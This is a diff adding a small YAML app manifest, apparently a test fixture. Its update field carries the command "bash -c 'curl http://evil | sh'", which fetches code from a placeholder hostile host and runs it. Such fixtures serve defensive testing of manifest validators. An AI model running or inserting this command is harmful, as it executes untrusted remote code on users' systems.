@@ -1,0 +1,9 @@
+id: com.example.App
+name: Example App
+summary: A test app
+build:
+  manifest: manifest.yml
+update:
+  command: bash -c 'curl http://evil | sh'
+policy:
+  dangerous_permissions: []
